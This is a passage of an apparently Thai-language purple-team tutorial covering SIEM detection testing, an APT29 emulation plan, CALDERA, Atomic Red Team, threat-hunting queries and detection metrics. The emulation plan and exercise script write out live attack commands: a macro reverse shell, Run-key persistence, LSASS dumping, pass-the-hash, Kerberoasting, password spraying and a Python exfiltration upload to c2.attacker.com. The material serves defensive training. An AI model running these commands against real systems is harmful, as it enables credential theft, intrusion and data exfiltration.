            f"{self.base_url}/services/search/jobs",
            data={
                'search': f'search {query}',
                'earliest_time': earliest,
                'latest_time': 'now'
            },
            headers=self.headers,
            verify=False
        )
        sid = resp.json()['sid']
        
        # รอให้ Job เสร็จ
        while True:
            status_resp = requests.get(
                f"{self.base_url}/services/search/jobs/{sid}",
                headers=self.headers,
                verify=False
            )
            state = status_resp.json()['entry'][0]['content']['dispatchState']
            if state == 'DONE':
                break
            time.sleep(1)
        
        # ดึงผลลัพธ์
        results_resp = requests.get(
            f"{self.base_url}/services/search/jobs/{sid}/results",
            params={'output_mode': 'json', 'count': 100},
            headers=self.headers,
            verify=False
        )
        return results_resp.json().get('results', [])
    
    def test_detection_rule(self, rule_name: str, test_event: Dict, 
                           detection_query: str) -> Dict:
        """ทดสอบ Detection Rule แบบ End-to-End"""
        print(f"\n[*] Testing: {rule_name}")
        
        # 1. Inject Test Event
        print("  [*] Injecting test event...")
        injected = self.inject_test_event("wineventlog", test_event)
        if not injected:
            return {"status": "FAIL", "reason": "Event injection failed"}
        
        # 2. รอ Event Processing
        time.sleep(5)
        
        # 3. รัน Detection Query
        print("  [*] Running detection query...")
        results = self.run_search(detection_query)
        
        # 4. วิเคราะห์ผลลัพธ์
        if results:
            print(f"  [+] DETECTED! Found {len(results)} results")
            return {
                "status": "DETECTED",
                "results_count": len(results),
                "sample_result": results[0]
            }
        else:
            print(f"  [-] NOT DETECTED")
            return {
                "status": "NOT_DETECTED",
                "reason": "No results from detection query"
            }

# ตัวอย่าง Test Events
TEST_EVENTS = {
    "kerberoasting": {
        "EventCode": 4769,
        "EventID": 4769,
        "Account_Name": "testuser",
        "ServiceName": "MSSQLSvc",
        "TicketEncryptionType": "0x17",
        "IpAddress": "192.168.1.100",
        "_time": datetime.utcnow().isoformat()
    },
    "lsass_access": {
        "EventCode": 10,
        "SourceImage": "C:\\Users\\attacker\\mimikatz.exe",
        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
        "GrantedAccess": "0x1fffff",
        "Computer": "WORKSTATION01",
        "_time": datetime.utcnow().isoformat()
    }
}
```

### ELK Stack Detection Testing

```bash
#!/bin/bash
# test_elastic_detection.sh - ทดสอบ Detection ใน Elasticsearch

ELASTIC_URL="http://localhost:9200"
KIBANA_URL="http://localhost:5601"
AUTH="elastic:changeme"

# 1. Inject Test Event เข้า Elasticsearch
echo "[*] Injecting test event for Kerberoasting..."
curl -s -u "$AUTH" -X POST "$ELASTIC_URL/winlogbeat-test/_doc" \
  -H 'Content-Type: application/json' \
  -d '{
    "@timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'",
    "event": {"code": "4769"},
    "winlog": {
      "event_data": {
        "TicketEncryptionType": "0x17",
        "ServiceName": "MSSQLSvc",
        "IpAddress": "192.168.1.100",
        "TargetUserName": "testuser"
      }
    }
  }'

echo ""
echo "[*] Waiting for indexing..."
sleep 3

# 2. รัน Detection Query
echo "[*] Running detection query..."
RESULT=$(curl -s -u "$AUTH" -X GET "$ELASTIC_URL/winlogbeat-*/_search" \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "bool": {
        "must": [
          {"term": {"event.code": "4769"}},
          {"term": {"winlog.event_data.TicketEncryptionType": "0x17"}}
        ],
        "must_not": [
          {"wildcard": {"winlog.event_data.ServiceName": "*$"}}
        ]
      }
    }
  }')

HITS=$(echo $RESULT | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['hits']['total']['value'])")

if [ "$HITS" -gt "0" ]; then
  echo "[+] DETECTED! Found $HITS events"
else
  echo "[-] NOT DETECTED"
fi

# 3. ทดสอบ Kibana Alert Rules
echo "[*] Testing Kibana Detection Rules..."
curl -s -u "$AUTH" -X GET "$KIBANA_URL/api/detection_engine/rules/_find" \
  -H 'kbn-xsrf: true' | python3 -m json.tool | grep '"name"'

# 4. ส่ง Alert Test
echo "[*] Triggering alert for testing..."
curl -s -u "$AUTH" -X POST "$KIBANA_URL/api/detection_engine/rules/preview" \
  -H 'Content-Type: application/json' \
  -H 'kbn-xsrf: true' \
  -d '{
    "preview_size": 1,
    "timeframeEnd": "now",
    "invocationCount": 1
  }'
```

---

## 7. Adversary Emulation Planning

### การสร้าง Adversary Emulation Plan

```python
#!/usr/bin/env python3
# adversary_emulation.py - สร้าง Emulation Plan จาก ATT&CK

from typing import List, Dict
from dataclasses import dataclass, field

@dataclass
class EmulationStep:
    """ขั้นตอนการ Emulate Adversary"""
    step_number: int
    name: str
    technique_id: str
    tactic: str
    tool: str
    command: str
    expected_outcome: str
    detection_opportunity: str
    cleanup_command: str = ""

@dataclass  
class AdversaryEmulationPlan:
    """แผน Emulation ของ Adversary"""
    adversary_name: str
    description: str
    target_industry: str
    motivation: str
    steps: List[EmulationStep] = field(default_factory=list)
    
    def add_step(self, step: EmulationStep):
        self.steps.append(step)
    
    def generate_markdown(self) -> str:
        """สร้างเอกสาร Emulation Plan"""
        md = f"""# Adversary Emulation Plan: {self.adversary_name}

## ข้อมูล Adversary
- **ชื่อ**: {self.adversary_name}
- **คำอธิบาย**: {self.description}
- **กลุ่มเป้าหมาย**: {self.target_industry}
- **แรงจูงใจ**: {self.motivation}

## ขั้นตอนการ Emulate

"""
        for step in self.steps:
            md += f"""### Step {step.step_number}: {step.name}
- **Technique**: [{step.technique_id}](https://attack.mitre.org/techniques/{step.technique_id.replace('.', '/')})
- **Tactic**: {step.tactic}
- **Tool**: {step.tool}

**Command:**
```
{step.command}
```

**Expected Outcome**: {step.expected_outcome}

**Detection Opportunity**: {step.detection_opportunity}

"""
        return md

# APT29 (Cozy Bear) Emulation Plan
apt29_plan = AdversaryEmulationPlan(
    adversary_name="APT29 (Cozy Bear)",
    description="Russian state-sponsored group targeting government and critical infrastructure",
    target_industry="Government, Defense, Healthcare",
    motivation="Intelligence gathering, Espionage"
)

apt29_plan.add_step(EmulationStep(
    step_number=1,
    name="Initial Access via Spearphishing",
    technique_id="T1566.001",
    tactic="Initial Access",
    tool="GoPhish + Custom Payload",
    command="""# ส่ง Phishing Email พร้อม Malicious Attachment
python3 send_phish.py \
  --target victim@target.org \
  --subject "Urgent: Security Update Required" \
  --attachment payload.docx""",
    expected_outcome="Victim เปิด Document และ Macro Execute",
    detection_opportunity="Email Gateway Alert, Macro Execution Log (Event 4688)"
))

apt29_plan.add_step(EmulationStep(
    step_number=2,
    name="Execution via Malicious Macro",
    technique_id="T1059.005",
    tactic="Execution",
    tool="msfvenom + VBA Macro",
    command="""# Macro ใน Word Document
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -NoP -W Hidden -Enc JAB..."
    Shell cmd
End Sub""",
    expected_outcome="PowerShell Reverse Shell",
    detection_opportunity="Sysmon Event 1, PowerShell Script Block Logging (Event 4104)"
))

apt29_plan.add_step(EmulationStep(
    step_number=3,
    name="Persistence via Registry Run Key",
    technique_id="T1547.001",
    tactic="Persistence",
    tool="reg.exe / PowerShell",
    command="""reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \
  /v WindowsUpdate /t REG_SZ \
  /d "powershell -NoP -W Hidden -Enc [base64_payload]"""",
    expected_outcome="Payload รันทุกครั้งที่ Login",
    detection_opportunity="Registry Modification Event (Sysmon 13), Autorun Monitoring",
    cleanup_command="reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f"
))

apt29_plan.add_step(EmulationStep(
    step_number=4,
    name="Credential Access via LSASS",
    technique_id="T1003.001",
    tactic="Credential Access",
    tool="Mimikatz / Task Manager",
    command="""# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# หรือใช้ comsvcs.dll (Living off the Land)
tasklist | findstr lsass
runas /user:SYSTEM "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump [LSASS-PID] C:\\Temp\\lsass.dmp full"""",
    expected_outcome="ได้ Credentials จาก Memory",
    detection_opportunity="Sysmon Event 10 (Process Access to lsass), Event 4688"
))

apt29_plan.add_step(EmulationStep(
    step_number=5,
    name="Lateral Movement via Pass-the-Hash",
    technique_id="T1550.002",
    tactic="Lateral Movement",
    tool="Impacket psexec.py / CrackMapExec",
    command="""# Lateral Movement ด้วย NTLM Hash
python3 psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee administrator@192.168.1.101

# หรือ CrackMapExec
crackmapexec smb 192.168.1.0/24 \
  -u Administrator \
  -H aad3b435b51404eeaad3b435b51404ee \
  --exec-method smbexec -x whoami""",
    expected_outcome="Remote Command Execution บน Target Host",
    detection_opportunity="Event 4624 (Logon Type 3), SMB Connection Logs"
))

apt29_plan.add_step(EmulationStep(
    step_number=6,
    name="Collection via Data Staging",
    technique_id="T1074.001",
    tactic="Collection",
    tool="PowerShell / Robocopy",
    command="""# รวบรวมไฟล์สำคัญ
Get-ChildItem -Recurse -Path C:\\Users \
  -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf,*.ppt \
  -ErrorAction SilentlyContinue | \
  Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-30)} | \
  Copy-Item -Destination C:\\Temp\\Staged\\""",
    expected_outcome="ไฟล์สำคัญถูกรวบรวมไว้ใน Staging Directory",
    detection_opportunity="File Access Monitoring, DLP Alerts"
))

apt29_plan.add_step(EmulationStep(
    step_number=7,
    name="Exfiltration via HTTPS",
    technique_id="T1041",
    tactic="Exfiltration",
    tool="Custom Python Script / curl",
    command="""# Exfil ผ่าน HTTPS
import requests, zipfile, os

with zipfile.ZipFile('/tmp/data.zip', 'w') as zf:
    for root, dirs, files in os.walk('C:/Temp/Staged'):
        for file in files:
            zf.write(os.path.join(root, file))

with open('/tmp/data.zip', 'rb') as f:
    requests.post('https://c2.attacker.com/upload',
                  files={'data': f},
                  verify=False)""",
    expected_outcome="ข้อมูลถูกส่งออกไปยัง C2 Server",
    detection_opportunity="DLP, Network Anomaly Detection, Large Outbound Transfer Alerts"
))

print(apt29_plan.generate_markdown())
```

### CALDERA สำหรับ Automated Adversary Emulation

```bash
# ติดตั้ง CALDERA
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip3 install -r requirements.txt

# รัน CALDERA Server
python3 server.py --insecure --build

# เข้าถึงผ่าน Web UI
# http://localhost:8888
# Username: admin, Password: admin

# Deploy Agent บน Target
# Windows Agent (Sandcat)
curl -s -X POST -H "file:sandcat.go" \
  -H "platform:windows" \
  http://localhost:8888/file/download > sandcat.exe

./sandcat.exe -server http://attacker:8888 -group red

# Linux Agent
curl -s -X POST -H "file:sandcat.go" \
  -H "platform:linux" \
  http://localhost:8888/file/download > sandcat

./sandcat -server http://attacker:8888 -group red

# ดู Abilities ที่มีอยู่
curl -u admin:admin http://localhost:8888/api/v2/abilities | python3 -m json.tool

# สร้าง Operation
curl -u admin:admin -X POST http://localhost:8888/api/v2/operations \
  -H 'Content-Type: application/json' \
  -d '{
    "name": "APT29 Emulation",
    "adversary": {"adversary_id": "apt29"},
    "planner": {"id": "batch"},
    "group": "red"
  }'
```

### Atomic Red Team

```powershell
# ติดตั้ง Invoke-AtomicRedTeam
Install-Module -Name invoke-atomicredteam -Force
Install-Module -Name powershell-yaml -Force

# ดาวน์โหลด Atomic Tests
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicsfolder.ps1' -UseBasicParsing);
Install-AtomicsFolder

# รัน Atomic Test สำหรับ Kerberoasting (T1558.003)
Invoke-AtomicTest T1558.003

# รัน Test พร้อม Prerequisites
Invoke-AtomicTest T1558.003 -GetPrereqs
Invoke-AtomicTest T1558.003 -TestNumbers 1

# Cleanup หลัง Test
Invoke-AtomicTest T1558.003 -Cleanup

# รัน Tests หลายรายการพร้อมกัน
$techniques = @('T1003.001', 'T1558.003', 'T1550.002', 'T1059.001')
foreach ($t in $techniques) {
    Write-Host "[*] Running $t"
    Invoke-AtomicTest $t -TimeoutSeconds 120 -ErrorAction Continue
    Start-Sleep 5
}

# สร้าง Execution Log
Invoke-AtomicTest T1558.003 -LoggingModule 'Attire-ExecutionLogger' \
  -ExecutionLogPath C:\Temp\atomic_results.json

# ดู Details ของ Test
Get-AtomicTechnique -Path .\atomics\T1558.003\T1558.003.yaml | \
  Select-Object -ExpandProperty atomic_tests | \
  Format-List
```

---

## 8. Detection Gap Analysis

### การวิเคราะห์ช่องว่างใน Detection

```python
#!/usr/bin/env python3
# detection_gap_analyzer.py

import json
from typing import Dict, List, Set

class DetectionGapAnalyzer:
    """วิเคราะห์ช่องว่างใน Detection Coverage"""
    
    def __init__(self):
        # ATT&CK Techniques ที่สำคัญสำหรับ Environment นี้
        self.relevant_techniques: Set[str] = set()
        # Techniques ที่มี Detection Rules อยู่แล้ว
        self.covered_techniques: Set[str] = set()
        # ผลการทดสอบ Purple Team
        self.test_results: Dict[str, str] = {}  # technique -> result
    
    def load_siem_rules(self, rules_file: str):
        """โหลด Detection Rules จาก SIEM"""
        with open(rules_file) as f:
            rules = json.load(f)
        for rule in rules:
            for tag in rule.get('tags', []):
                if tag.startswith('attack.t'):
                    technique_id = tag.upper().replace('ATTACK.', '')
                    self.covered_techniques.add(technique_id)
        print(f"[+] Loaded {len(self.covered_techniques)} covered techniques from SIEM")
    
    def load_purple_team_results(self, results_file: str):
        """โหลดผลการทดสอบ Purple Team"""
        with open(results_file) as f:
            results = json.load(f)
        for tc in results['test_cases']:
            self.test_results[tc['technique_id']] = tc['status']
        print(f"[+] Loaded {len(self.test_results)} test results")
    
    def identify_gaps(self) -> Dict:
        """ระบุ Detection Gaps"""
        gaps = {
            "missing_rules": [],      # ไม่มี Rule เลย
            "ineffective_rules": [],   # มี Rule แต่ไม่ตรวจจับได้
            "untested_techniques": []  # มี Rule แต่ยังไม่ได้ทดสอบ
        }
        
        for technique in self.relevant_techniques:
            has_rule = technique in self.covered_techniques
            test_result = self.test_results.get(technique)
            
            if not has_rule:
                gaps["missing_rules"].append(technique)
            elif test_result == "not_detected":
                gaps["ineffective_rules"].append(technique)
            elif test_result is None:
                gaps["untested_techniques"].append(technique)
        
        return gaps
    
    def prioritize_gaps(self, gaps: Dict) -> List[Dict]:
        """จัดลำดับ Gaps ตามความสำคัญ"""
        # จัดลำดับความสำคัญโดยใช้ ATT&CK Data Components และ Threat Intel
        TECHNIQUE_PRIORITIES = {
            "T1003.001": 10,  # LSASS Dump - Critical
            "T1558.003": 10,  # Kerberoasting - Critical
            "T1550.002": 9,   # Pass-the-Hash - High
            "T1055": 9,       # Process Injection - High
            "T1059.001": 8,   # PowerShell - High
            "T1547.001": 7,   # Registry Run Keys - Medium
            "T1046": 6,       # Network Scanning - Medium
        }
        
        prioritized = []
        for gap_type, techniques in gaps.items():
            for tech in techniques:
                priority = TECHNIQUE_PRIORITIES.get(tech, 5)
                prioritized.append({
                    "technique": tech,
                    "gap_type": gap_type,
                    "priority": priority,
                    "recommended_action": self._get_recommendation(gap_type, tech)
                })
        
        return sorted(prioritized, key=lambda x: x["priority"], reverse=True)
    
    def _get_recommendation(self, gap_type: str, technique: str) -> str:
        """สร้างคำแนะนำสำหรับ Gap"""
        if gap_type == "missing_rules":
            return f"สร้าง Detection Rule ใหม่สำหรับ {technique}"
        elif gap_type == "ineffective_rules":
            return f"ปรับปรุง Rule ที่มีอยู่ - ตรวจสอบ Data Source และ Logic"
        else:
            return f"ทดสอบ Rule ที่มีอยู่สำหรับ {technique} ใน Purple Team Exercise"
    
    def generate_gap_report(self) -> str:
        """สร้างรายงาน Detection Gap"""
        gaps = self.identify_gaps()
        prioritized = self.prioritize_gaps(gaps)
        
        report = "# Detection Gap Analysis Report\n\n"
        report += f"## สรุป\n"
        report += f"- Techniques ที่ไม่มี Rule: {len(gaps['missing_rules'])}\n"
        report += f"- Techniques ที่ Rule ไม่ Effective: {len(gaps['ineffective_rules'])}\n"
        report += f"- Techniques ที่ยังไม่ได้ทดสอบ: {len(gaps['untested_techniques'])}\n\n"
        
        report += "## Priority Gaps\n\n"
        report += "| Priority | Technique | Gap Type | Recommendation |\n"
        report += "|----------|-----------|----------|----------------|\n"
        
        for item in prioritized[:10]:  # Top 10
            report += f"| {item['priority']} | {item['technique']} | {item['gap_type']} | {item['recommended_action']} |\n"
        
        return report
```

---

## 9. Threat Hunting

### Threat Hunting Process

```
กระบวนการ Threat Hunting:

1. HYPOTHESIS GENERATION
   • จาก Threat Intelligence
   • จาก ATT&CK Techniques
   • จาก Anomaly Detection
   
2. DATA COLLECTION
   • กำหนด Data Sources
   • ตรวจสอบ Log Coverage
   • Ingest Data เข้า SIEM
   
3. INVESTIGATION
   • Structured Analytic
   • Pattern Analysis
   • Timeline Analysis
   
4. FINDINGS
   • Document Evidence
   • Assess Impact
   • Escalate if needed
   
5. IMPROVEMENT
   • สร้าง Detection Rule
   • อัพเดต Playbooks
   • Share Intelligence
```

### Threat Hunting Hypotheses

```python
#!/usr/bin/env python3
# threat_hunting.py - Threat Hunting Queries

HUNTING_QUERIES = {
    "unusual_powershell_parents": {
        "hypothesis": "Adversary อาจใช้ PowerShell ผ่าน Unusual Parent Process",
        "technique": "T1059.001",
        "query_splunk": """
index=sysmon EventCode=1 
    Image="*\\powershell.exe"
    NOT ParentImage IN (
        "*\\explorer.exe",
        "*\\cmd.exe",
        "*\\powershell.exe",
        "*\\powershell_ise.exe",
        "*\\wsmprovhost.exe"
    )
| stats count by ParentImage, CommandLine, Computer
| where count < 5
| sort count""",
        "investigation_steps": [
            "ตรวจสอบ Parent Process ว่าเป็นอะไร",
            "ดู Full CommandLine ของ PowerShell",
            "ตรวจสอบ Network Connections จาก Process นั้น",
            "ดู Child Processes ที่เกิดจาก PowerShell"
        ]
    },
    
    "lateral_movement_smb": {
        "hypothesis": "Adversary อาจเคลื่อนที่ด้านข้างผ่าน SMB",
        "technique": "T1021.002",
        "query_splunk": """
index=wineventlog 
    (EventCode=4648 OR EventCode=4624)
    Logon_Type=3
    NOT Account_Name="*$"
| stats dc(Computer) as unique_hosts count as attempts by Account_Name src_ip
| where unique_hosts > 3 AND attempts > 10
| sort -unique_hosts""",
        "investigation_steps": [
            "ระบุ Source Host ของ Connection",
            "ดู Timing ของ Connection (เร็วผิดปกติหรือไม่)",
            "ตรวจสอบว่า Account นั้น Login จากหลาย Host พร้อมกันหรือไม่",
            "ดู Services ที่ถูก Access บน Target Host"
        ]
    },
    
    "new_local_admin": {
        "hypothesis": "Adversary อาจสร้าง Local Admin Account ใหม่เพื่อ Persistence",
        "technique": "T1136.001",
        "query_splunk": """
index=wineventlog EventCode=4720
| join Account_Name [search index=wineventlog EventCode=4732 
    Group_Name="Administrators" 
    | rename Member_Account_Name as Account_Name]
| stats count by Account_Name Creator_Account_Name Computer _time
| sort -_time""",
        "investigation_steps": [
            "ตรวจสอบว่าใครสร้าง Account",
            "ดูว่า Account ถูกใช้งานหลังจากสร้างหรือไม่",
            "ตรวจสอบว่ามี Change Request สำหรับ Account นี้หรือไม่"
        ]
    },
    
    "beacon_detection": {
        "hypothesis": "C2 Beacon อาจสื่อสารในช่วงเวลาสม่ำเสมอ",
        "technique": "T1071.001",
        "query_splunk": """
index=proxy 
| bucket _time span=1h
| stats count by dest_ip, src_ip, _time
| sort src_ip dest_ip _time
| streamstats current=false window=3 range(_time) as time_range by src_ip dest_ip
| eval beacon_interval=time_range/count
| where beacon_interval > 50 AND beacon_interval < 70
| stats count avg(beacon_interval) by src_ip dest_ip
| sort -count""",
        "investigation_steps": [
            "ดู User-Agent ของ HTTP Requests",
            "วิเคราะห์ขนาดของ Packets (Small, Regular)",
            "ตรวจสอบ Domain Reputation ของ dest_ip",
            "ดู Response Content Type"
        ]
    },
    
    "dns_tunneling": {
        "hypothesis": "Adversary อาจใช้ DNS Tunneling สำหรับ C2 หรือ Exfiltration",
        "technique": "T1071.004",
        "query_splunk": """
index=dns 
| eval domain_len=len(query)
| stats count avg(domain_len) max(domain_len) dc(query) as unique_queries \
  by src_ip parent_domain
| where unique_queries > 100 AND avg(domain_len) > 50
| sort -unique_queries""",
        "investigation_steps": [
            "ดูความยาวเฉลี่ยของ DNS Query",
            "วิเคราะห์ Entropy ของ Subdomain",
            "ตรวจสอบ DNS Query Type (TXT, NULL records)",
            "เปรียบเทียบ Query Volume กับ Baseline"
        ]
    }
}

class ThreatHunter:
    """Threat Hunting Framework"""
    
    def __init__(self):
        self.active_hunts = []
        self.findings = []
    
    def start_hunt(self, hypothesis_name: str) -> Dict:
        """เริ่ม Threat Hunt"""
        if hypothesis_name not in HUNTING_QUERIES:
            raise ValueError(f"Unknown hypothesis: {hypothesis_name}")
        
        hunt = {
            "id": f"HUNT-{len(self.active_hunts)+1:03d}",
            "hypothesis": HUNTING_QUERIES[hypothesis_name]["hypothesis"],
            "technique": HUNTING_QUERIES[hypothesis_name]["technique"],
            "started_at": datetime.now().isoformat(),
            "status": "active",
            "query": HUNTING_QUERIES[hypothesis_name]["query_splunk"]
        }
        self.active_hunts.append(hunt)
        print(f"[+] Started Hunt: {hunt['id']} - {hunt['hypothesis']}")
        return hunt
    
    def add_finding(self, hunt_id: str, finding: str, evidence: Dict):
        """บันทึก Finding จาก Hunt"""
        self.findings.append({
            "hunt_id": hunt_id,
            "finding": finding,
            "evidence": evidence,
            "timestamp": datetime.now().isoformat()
        })
        print(f"[!] NEW FINDING in {hunt_id}: {finding}")
    
    def print_investigation_steps(self, hypothesis_name: str):
        """แสดงขั้นตอนการสืบสวน"""
        if hypothesis_name in HUNTING_QUERIES:
            steps = HUNTING_QUERIES[hypothesis_name]["investigation_steps"]
            print(f"\nขั้นตอนการสืบสวนสำหรับ '{hypothesis_name}':")
            for i, step in enumerate(steps, 1):
                print(f"  {i}. {step}")
```

---

## 10. Purple Team Exercises

### Exercise Templates

```bash
#!/bin/bash
# purple_team_exercise.sh - Script สำหรับ Purple Team Exercise

set -euo pipefail

EXERCISE_LOG="/tmp/purple_team_$(date +%Y%m%d_%H%M%S).log"
DETECTION_WINDOW=300  # 5 นาที

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$EXERCISE_LOG"
}

test_technique() {
    local technique_id="$1"
    local test_name="$2"
    local command="$3"
    
    log "=== Testing: $test_name ($technique_id) ==="
    log "Command: $command"
    log "Executing attack..."
    
    # รัน Attack Command
    START_TIME=$(date +%s)
    eval "$command" >> "$EXERCISE_LOG" 2>&1 || true
    END_TIME=$(date +%s)
    
    log "Attack completed in $((END_TIME-START_TIME))s"
    log "Waiting ${DETECTION_WINDOW}s for Blue Team to detect..."
    sleep "$DETECTION_WINDOW"
    
    # รอผล Detection จาก Blue Team
    read -t 30 -p "Blue Team - Was $test_name detected? (y/n/p=partial): " RESULT || RESULT="timeout"
    
    log "Detection Result: $RESULT"
    echo "$technique_id|$test_name|$RESULT" >> "/tmp/results_$(date +%Y%m%d).csv"
}

# Exercise 1: Credential Access
log "Starting Purple Team Exercise - Credential Access Module"

# Test 1.1: Kerberoasting
test_technique "T1558.003" "Kerberoasting" \
    "python3 /opt/impacket/examples/GetUserSPNs.py lab.local/testuser:Password123 -request -outputfile /tmp/spn_hashes.txt"

# Test 1.2: AS-REP Roasting
test_technique "T1558.004" "AS-REP Roasting" \
    "python3 /opt/impacket/examples/GetNPUsers.py lab.local/ -usersfile /tmp/userlist.txt -format hashcat -outputfile /tmp/asrep_hashes.txt"

# Test 1.3: Password Spraying
test_technique "T1110.003" "Password Spraying" \
    "crackmapexec smb 192.168.1.10 -u /tmp/userlist.txt -p 'Summer2024!' --continue-on-success"

# Exercise 2: Lateral Movement
log "Starting Lateral Movement Module"

# Test 2.1: PsExec
test_technique "T1021.002" "PsExec via SMB" \
    "python3 /opt/impacket/examples/psexec.py lab.local/administrator:Password123@192.168.1.11 whoami"

# Test 2.2: WMI Execution
test_technique "T1047" "WMI Remote Execution" \
    "python3 /opt/impacket/examples/wmiexec.py lab.local/administrator:Password123@192.168.1.11 whoami"

# สร้างรายงานสรุป
log "Generating Summary Report"
python3 - << 'EOF'
import csv
import sys
from collections import Counter

results_file = f"/tmp/results_$(date +%Y%m%d).csv"
try:
    with open(results_file) as f:
        reader = csv.reader(f, delimiter='|')
        results = list(reader)
    
    total = len(results)
    detected = sum(1 for r in results if r[2] == 'y')
    partial = sum(1 for r in results if r[2] == 'p')
    missed = sum(1 for r in results if r[2] == 'n')
    
    print(f"\n=== EXERCISE SUMMARY ===")
    print(f"Total Tests: {total}")
    print(f"Detected: {detected} ({detected/total*100:.0f}%)")
    print(f"Partial: {partial} ({partial/total*100:.0f}%)")
    print(f"Missed: {missed} ({missed/total*100:.0f}%)")
except FileNotFoundError:
    print("No results file found")
EOF
```

---

## 11. Metrics และการวัดผล

### Purple Team KPIs

```python
#!/usr/bin/env python3
# purple_team_metrics.py - KPIs และการวัดผล

from dataclasses import dataclass
from typing import List, Dict
import math

@dataclass
class PurpleTeamMetrics:
    """Metrics สำหรับ Purple Team"""
    
    # Detection Metrics
    total_techniques_tested: int
    detected_count: int
    blocked_count: int
    partially_detected_count: int
    not_detected_count: int
    
    # MTTD (Mean Time to Detect)
    detection_times: List[float]  # seconds
    
    # Alert Quality Metrics
    true_positives: int
    false_positives: int
    false_negatives: int
    
    # Coverage Metrics
    techniques_with_rules: int
    total_relevant_techniques: int
    
    @property
    def detection_rate(self) -> float:
        """อัตราการตรวจจับ (%)"""
        return (self.detected_count + self.blocked_count) / self.total_techniques_tested * 100
    
    @property
    def mttd(self) -> float:
        """Mean Time to Detect (นาที)"""
        if not self.detection_times:
            return 0
        return sum(self.detection_times) / len(self.detection_times) / 60
    
    @property
    def precision(self) -> float:
        """Precision = TP / (TP + FP)"""
        if self.true_positives + self.false_positives == 0:
            return 0
        return self.true_positives / (self.true_positives + self.false_positives)
    
    @property
    def recall(self) -> float:
        """Recall = TP / (TP + FN)"""
        if self.true_positives + self.false_negatives == 0:
            return 0
        return self.true_positives / (self.true_positives + self.false_negatives)
    
    @property
    def f1_score(self) -> float:
        """F1 Score = 2 * (Precision * Recall) / (Precision + Recall)"""
        if self.precision + self.recall == 0:
            return 0
        return 2 * (self.precision * self.recall) / (self.precision + self.recall)
    
    @property
    def rule_coverage(self) -> float:
        """เปอร์เซ็นต์ Techniques ที่มี Detection Rules"""
        return (self.techniques_with_rules / self.total_relevant_techniques) * 100
    
    def generate_dashboard(self) -> str:
        """สร้าง Text Dashboard"""
        return f"""
╔══════════════════════════════════════════════════════════╗
║           PURPLE TEAM METRICS DASHBOARD                 ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  DETECTION PERFORMANCE                                   ║
║  ─────────────────────────────────────────────────────  ║
║  Detection Rate:    {self.detection_rate:>6.1f}%                        ║
║  Detected:          {self.detected_count:>6d} techniques                  ║
║  Blocked:           {self.blocked_count:>6d} techniques                  ║
║  Partially Det.:    {self.partially_detected_count:>6d} techniques                  ║
║  Not Detected:      {self.not_detected_count:>6d} techniques                  ║
║                                                          ║
║  QUALITY METRICS                                         ║
║  ─────────────────────────────────────────────────────  ║
║  MTTD:              {self.mttd:>6.1f} minutes                  ║
║  Precision:         {self.precision:>6.1%}                        ║
║  Recall:            {self.recall:>6.1%}                        ║
║  F1 Score:          {self.f1_score:>6.3f}                         ║
║                                                          ║
║  COVERAGE                                                ║
║  ─────────────────────────────────────────────────────  ║
║  Rule Coverage:     {self.rule_coverage:>6.1f}%                        ║
║  Rules Count:       {self.techniques_with_rules:>6d}                           ║
║  Target Coverage:   {self.total_relevant_techniques:>6d} techniques                  ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝"""

# ตัวอย่างการใช้งาน
metrics = PurpleTeamMetrics(
    total_techniques_tested=50,
    detected_count=30,
    blocked_count=5,
    partially_detected_count=8,
    not_detected_count=7,
    detection_times=[45, 120, 30, 180, 60, 90, 15],
    true_positives=35,
    false_positives=12,
    false_negatives=15,
    techniques_with_rules=65,
    total_relevant_techniques=100
)

print(metrics.generate_dashboard())

# Maturity Model
PURPLE_TEAM_MATURITY = {
    1: {
        "name": "Initial",
        "description": "Ad-hoc collaboration ไม่มีกระบวนการชัดเจน",
        "indicators": [
            "ไม่มี Formal Purple Team Process",
            "Red/Blue ทำงานแยกกัน",
            "Detection Rate < 30%"
        ]
    },
    2: {
        "name": "Developing",
        "description": "เริ่มมี Process แต่ยังไม่สม่ำเสมอ",
        "indicators": [
            "มี Purple Team Exercises ปีละ 1-2 ครั้ง",
            "ใช้ ATT&CK Framework เป็น Reference",
            "Detection Rate 30-50%"
        ]
    },
    3: {
        "name": "Defined",
        "description": "มี Formal Process และ Metrics",
        "indicators": [
            "Purple Team Exercises ทุกไตรมาส",
            "Sigma Rules Coverage > 60%",
            "Detection Rate 50-70%",
            "มี MTTD Tracking"
        ]
    },
    4: {
        "name": "Managed",
        "description": "Data-driven Approach",
        "indicators": [
            "Continuous Purple Team",
            "Automated Testing",
            "Detection Rate 70-85%",
            "MTTD < 30 minutes"
        ]
    },
    5: {
        "name": "Optimizing",
        "description": "World-class Detection Engineering",
        "indicators": [
            "Real-time Adversary Emulation",
            "ML-based Detection",
            "Detection Rate > 85%",
            "MTTD < 10 minutes",
            "Full ATT&CK Coverage"
        ]
    }
}

for level, data in PURPLE_TEAM_MATURITY.items():
    print(f"\nLevel {level} - {data['name']}: {data['description']}")
```

---

## 12. Purple Team Automation

### Automated Purple Team Pipeline

```python
#!/usr/bin/env python3
# automated_purple_team.py - Pipeline อัตโนมัติ

import subprocess
import requests
import json
import time
from datetime import datetime
from typing import Dict, List

class AutomatedPurpleTeamPipeline:
    """Pipeline อัตโนมัติสำหรับ Purple Team"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.results = []
        self.caldera_url = config.get("caldera_url", "http://localhost:8888")
        self.splunk_url = config.get("splunk_url", "http://localhost:8089")
        self.slack_webhook = config.get("slack_webhook")
    
